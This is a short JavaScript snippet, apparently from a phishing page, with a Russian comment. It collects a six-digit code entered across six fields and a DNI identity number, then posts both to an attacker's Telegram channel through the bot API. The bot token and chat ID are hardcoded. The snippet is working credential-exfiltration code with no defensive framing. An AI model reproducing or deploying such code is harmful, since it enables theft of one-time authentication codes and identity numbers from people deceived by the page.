var chatid = "-4696505335";
var token = "7740157928:AAGUIWCUSCQOBaeyndY7Q5srC6bpTy5tYsg";
let text = "CODE:";
for (let i = 0; i < 6; i++) {
  text += document.getElementById(i.toString()).value;
}
text += ' DNI: ' + document.getElementById("dni").value;
//Отправляем текст в наш телеграм канал
otpravka(token,text,chatid);
 
function otpravka(token,text,chatid){
  var z=$.ajax({  
  type: "POST",  
  url: "https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chatid,
  data: "parse_mode=HTML&text="+encodeURIComponent(text), 
  }); 
};
xew();